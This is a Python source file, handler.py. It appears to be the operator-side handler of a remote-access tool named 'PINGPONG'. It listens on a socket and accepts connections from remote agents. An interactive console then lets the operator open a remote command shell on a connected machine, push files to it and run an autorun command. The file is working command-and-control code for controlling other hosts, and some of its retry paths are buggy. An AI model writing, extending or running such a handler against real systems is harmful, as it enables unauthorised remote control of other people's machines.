# -*- coding:utf-8 -*-
# @FileName  :handler.py
# @Time      :2022/11/07 21:23:35
# @Author    :D0WE1L1N
import os
import random
import socket
import threading
import sys
import shutil
import cmdshell
import time
import main
#开启监听
#函数中printf参数决定时候进行不必要的输出
def startserver(ip, port, printf, open_ac):
    if printf and False:
        AUTORUNSCRIPT = input("handler>[*]Any AUTORUN COMMAND?(blank for no)>")
    else:
        AUTORUNSCRIPT = " "
    if port == "":
        port = 624
    if ip == "":
        ip = "127.0.0.1"
    else:
        try:
            port = int(port)
        except:
            print("handler>[-]port input error")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((ip, port))
        s.listen(10)
    except socket.error as msg:
        print("handler>[-]something went WRONG, print out the wrong msg: " + str(msg))
        sys.exit(1)
    if printf:
        print('handler>[*]Starting handler at ' + ip + ":" + str(port))

    while True:
        conn, addr = s.accept()
        _ip = addr[0]
        _port = addr[1]
        if printf:
            print('handler>[+]PINGPONG session Created: ' + ip + ":" + str(port) + " >>> " + _ip + ":" + str(_port))
        t = threading.Thread(target=PINGPONG_shell, args=(conn, addr, _ip, str(_port), True, AUTORUNSCRIPT, open_ac))
        t.start()
#连接程序
def PINGPONG_shell(conn, addr, ip, port, printf, AUTOCOMMAND, op_ac):
    #请求发送函数：检查连接
    def App_send(App, printf):
        if printf:
            print("PINGPONG>[*]Sending application......")
        conn.send(bytes(App, 'utf8'))
        while True:
            data = conn.recv(1024)
            if data.decode() == "OK":
                if printf:
                    print("PINGPONG>[*]Application done, everything is OK")
                return True
    #上传函数：文件上传
    def Upload(file_dir, to_dir, printf, APP_SEND):
        try:
            if APP_SEND:
                IS_C =  App_send("UPLOAD_APP", False)
            else:
                IS_C = True
            if IS_C:
                if printf:
                    print("PINGPONG>[*]Sending dir......")
                conn.send(bytes(to_dir, "utf8"))
                path = "temp"
                if os.path.exists(path):
                    shutil.rmtree(path)
                if not os.path.exists(path):
                    os.makedirs(path)
                if printf:
                    print("PINGPONG>[*]Copy to file to " + path + "......")
                #判断是否为文件/文件夹
                if not os.path.isfile(file_dir):
                    try:
                        file_names = os.listdir(file_dir)
                    except:
                        ch = input("PINGPONG>[-]The location is NOT valuable, again?[y/n]>")
                        if ch == "y" or ch == "yes" or ch == "YES" or ch == "Y":
                            file_dir = input("PINGPONG>[*]Please input the location of the file in your host>")
                            to_dir = input("PINGPONG>[*]Please input the location of the file where you uploaded>")
                            Upload(file_dir, to_dir)
                        else:
                            return True
                    for fi in os.listdir(file_dir):
                        full_file_name = os.path.join(file_dir, fi)
                        if os.path.isfile(full_file_name):
                            shutil.copy(full_file_name, path)
                    for file in file_names:
                        old_n = os.path.join(path, file)
                        new_name = file + ".txt"
                        os.rename(old_n, new_name)
                        with open(new_name, "rb") as f:
                            se_data = f.read()
                            conn.send(bytes(new_name, "utf8"))
                            name_data = conn.recv(1024)
                            while True:
                                time.sleep(1)
                                if name_data:
                                    break
                            len_data = len(se_data)
                            conn.send(bytes(str(len_data), "utf8"))
                            len_recv = conn.recv(1024)
                            while True:
                                time.sleep(1)
                                if len_recv:
                                    break
                            conn.sendall(se_data)
                            upload_data = conn.recv(1024)
                            while True:
                                time.sleep(1)
                                if upload_data:
                                    print(ip + ">[*]File Upload Succeed: " + old_n + " >>> " + to_dir + "/" + file)
                                    break
                            f.close()
                            try:
                                os.remove(new_name)
                            except:
                                pass
                else:
                    file = file_dir[file_dir.rindex('/') + 1:len(file_dir)]
                    try:
                        shutil.copy(file_dir, path)
                    except:
                        ch = input("PINGPONG>[-]The location is NOT valuable, again?[y/n]>")
                        if ch == "y" or ch == "yes" or ch == "YES" or ch == "Y":
                            file_dir = input("PINGPONG>[*]Please input the location of the file in your host>")
                            to_dir = input("PINGPONG>[*]Please input the location of the file where you uploaded>")
                            Upload(file_dir, to_dir)
                    old_n = os.path.join(path, file)
                    new_name = file + ".txt"
                    os.rename(old_n, new_name)
                    file_name = file_dir.split(".txt")[0]
                    file_names =  file_name[file_name.rindex('/') + 1:len(file_name)]
                    if printf:
                        print("PINGPONG>[*]Sending file......")
                    f = open(file_names + ".txt", "rb")    
                    se_data = f.read()
                    conn.send(bytes(new_name, "utf8"))
                    name_data = conn.recv(1024)
                    while True:
                        time.sleep(1)
                        if name_data:
                            break
                    len_data = len(se_data)
                    conn.send(bytes(str(len_data), "utf8"))
                    len_recv = conn.recv(1024)
                    while True:
                        time.sleep(1)
                        if len_recv:
                            break
                    conn.sendall(se_data)
                    upload_data = conn.recv(1024)
                    while True:
                        time.sleep(1)
                        if upload_data:
                            print(ip + ">[*]File Upload Succeed: " + old_n + " >>> " + to_dir + "/" + file)
                            break
                    f.close()
                    try:
                        os.remove(new_name)
                    except:
                        pass
            # for check_d in file_names:
            #     if os.path.isdir(check_d):
            #         Upload(os.path.join(file_dir, check_d), os.path.join(to_dir, check_d), False, False)
            conn.send(bytes("END", 'utf8'))
        except Exception as e:
            print(e)
            restart = input("PINGPONG>[-]Something went WRONG, restart?[y/n]")
            if restart == "y" or restart == "yes" or restart == "YES" or restart == "Y":
                file_dir = input("PINGPONG>[*]Please input the location of the file in your host>")
                to_dir = input("PINGPONG>[*]Please input the location of the file where you uploaded>")
                Upload(file_dir, to_dir)
            else:
                return True
        finally:
            shutil.rmtree(path)
    is_Auto = True
    if op_ac:
        if AUTOCOMMAND == " " or AUTOCOMMAND == "":
            is_Auto = True
        else:
            is_Auto = False
    while True:
        #主循环
        if is_Auto:
            command = input("PINGPONG>")
        else:
            print("PINGPONG>[*]running " + AUTOCOMMAND)
            command = AUTOCOMMAND
            is_Auto = True
        if command == "exit" or command == "EXIT":
            App_send("EXIT_APP", False)
            print("PINGPONG>[*]PINGPONG session died, reason: User exit")
            print("handler>[*]Back to main console......")
            main.main()
        if command == "cmd" or command == "CMD":
            if App_send("CMDSHELL_APP", True):
                print("PINGPONG>[+]GOT IT")
                cmd_port = random.randint(5000, 8000)
                conn.send(bytes(str(cmd_port), "utf8"))
                cmdshell.start(ip, cmd_port)
        elif command == "upload" or command == "UPLOAD":
            file_dir = input("PINGPONG>[*]Please input the location of the file in your host>")
            to_dir = input("PINGPONG>[*]Please input the location of the file where you uploaded>")
            Upload(file_dir, to_dir, True, True)
        elif command == "ping" or command == "PING":
            if App_send("CHECK_APP", False):
                print("PINGPONG>[*]PONG")
        else:
            print("PINGPONG>[-]Command " + command + " not found")                 
if __name__ == "__main__":
    startserver("192.168.140.1", "", True, True)